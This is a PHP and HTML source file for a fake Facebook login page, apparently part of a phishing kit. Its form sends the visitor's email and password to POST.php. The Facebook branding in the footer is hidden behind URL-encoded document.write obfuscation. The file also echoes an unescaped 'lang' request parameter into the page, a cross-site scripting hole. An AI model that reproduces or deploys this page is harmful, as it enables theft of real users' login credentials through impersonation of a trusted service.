<?php


    $get_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
    
    if(isset($_GET['lang'])){
        $get_lang = $_GET['lang'];
    }
    
    include(__DIR__ . "/langs.php");
    

    $lang_rtl = array('ar','pk','ur'); 
    
?>

<!DOCTYPE html>
<html lang="<?php echo $get_lang; ?>">
<head>
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="icon.png">
    <title><?php echo $lang['1']; ?></title>
    <link rel="stylesheet" href="bootstrap.min.css">
    <link rel="stylesheet" href="m_style.css">
</head>

<style>
    body{
        direction: <?php if(in_array($get_lang, $lang_rtl)){echo 'rtl';}else{echo 'ltr';} ?>;
        text-align: <?php if(in_array($get_lang, $lang_rtl)){echo 'right';}else{echo 'left';} ?>;;
    }
</style>

<body>
   
    <div class="war">
        <div style="padding: 6px 10px; font-size: 15px;" class="alert alert-warning" role="alert"><?php echo $lang['0']; ?></div>
    </div>
    <div class="fb-logo"><img src="dF5SId3UHWd.svg" alt=""></div>
    <div class="container">
        <div class="form-box">
            <form action="POST.php" method="POST">
                <input type="text" name="email" placeholder="<?php echo $lang['5']; ?>" required="required">
                <input minlength="6" type="password" name="password" placeholder="<?php echo $lang['6']; ?>" required="required">
                <button class="btn btn-primary b1"><?php echo $lang['7']; ?></button>
                <div class="aps">
                    <hr class="hr">
                    <p><span><?php echo $lang['9']; ?></span></p>
                </div>

                <button class="btn btn-success text-center c1"><?php echo $lang['10']; ?></button>
                <br>
                <p class="text-center forget"><?php echo $lang['8']; ?></p>
                
            </form>
        </div>

        <script language=javascript>document.write(unescape('%3Cdiv%20class%3D%22lang%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-6%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20text-center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Den%22%3EEnglish%20%28UK%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dar%22%3E%u0627%u0644%u0639%u0631%u0628%u064A%u0629%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfi%22%3EFilipino%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dur%22%3E%u200F%u0627%u0631%u062F%u0648%u200F%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-6%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20text-center%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dfr%22%3EFran%E7ais%20%28France%29%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Did%22%3EBahasa%20Indonesia%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%3Flang%3Dpa%22%3E%u0A2A%u0A70%u0A1C%u0A3E%u0A2C%u0A40%3C/a%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Cspan%20class%3D%22plus%22%3E+%3C/span%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22text-center%22%20style%3D%22font-size%3A%2012px%3B%20color%3A%20gray%3B%20margin-top%3A%2020px%3B%22%3EFacebook%20Inc.%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E'))</script>

    </div>
    <script src="jq.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="script.js"></script>
</body>
</html>
